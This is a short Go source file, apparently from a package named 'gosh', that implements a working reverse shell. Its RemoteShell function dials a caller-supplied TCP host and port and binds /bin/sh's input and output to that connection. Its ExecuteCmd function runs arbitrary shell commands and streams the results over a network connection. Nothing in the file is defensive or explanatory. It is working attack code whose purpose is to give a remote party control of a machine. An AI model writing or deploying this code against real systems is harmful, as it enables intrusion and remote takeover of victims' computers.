//go:build linux || darwin || freebsd || !windows
// +build linux darwin freebsd !windows

package gosh

import (
	"net"
	"os/exec"
)

func RemoteShell(hostport string) error {
	conn, err := net.Dial("tcp", hostport)
	if nil != err {
		return err
	}
	cmd := exec.Command("/bin/sh")
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
	conn.Close()
	return nil
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "/bin/sh"
	cmd := exec.Command(cmd_path, "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}
